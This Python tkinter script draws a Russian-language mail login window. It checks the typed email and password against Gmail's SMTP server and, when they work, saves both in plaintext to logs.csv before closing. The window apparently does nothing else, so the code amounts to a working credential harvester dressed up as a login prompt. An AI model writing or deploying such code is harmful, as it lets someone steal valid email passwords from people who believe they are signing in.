import smtplib
from tkinter import *
from tkinter import messagebox as mb


def login_func(*args):
    try:
        username = user_entry.get()
        password = pass_entry.get()
        conn = smtplib.SMTP('smtp.gmail.com' , 587)
        conn.ehlo()
        conn.starttls()
        conn.login(username,password)
        conn.quit()
        f = open('logs.csv','w')
        to_write = f'username,password\n{username},{password}'
        f.write(to_write)
        f.close()
        log.destroy()
    except:
        mb.showerror('Ошибка','Неверный Email или Password.')


def login():
    global log
    log = Tk()
    log.title('Вход')
    log.geometry('300x250+220+170')
    log.configure(bg='white')
    log.resizable(0,0)

    log_label = Label(log, text='Вход в почту', width=30, height=1, font=('Arial Black',20,'bold'),bg='royal blue',fg='white')
    log_label.pack()

    u = Label(log, text='Email :', font=('Arial Black',14,'bold'),bg='white')
    u.place(x=10,y=50)

    global user_entry
    user_entry = Entry(log, font=('Arial Black',10,'bold'),  width=25,bg='ghost white')
    user_entry.place(x=10, y=80)


    p = Label(log, text='Password :', font=('Arial Black',14,'bold'),bg='white')
    p.place(x=10,y=110)

    global pass_entry
    pass_entry = Entry(log,show='*', font=('Arial Black',10,'bold'),  width=25,bg='ghost white')
    pass_entry.place(x=10, y=140)

    resp = Label(log, text='',font=('Arial Black',10,'bold'),bg='white')
    resp.place(x=10, y=250)

    submit = Button(log, text='Войти',font=('Arial Black',10,'bold'), width=14, bg='white', command=login_func,bd=0,fg='black')
    submit.place(x=10, y=180)

    log.bind('<Return>', login_func)

    log.mainloop()

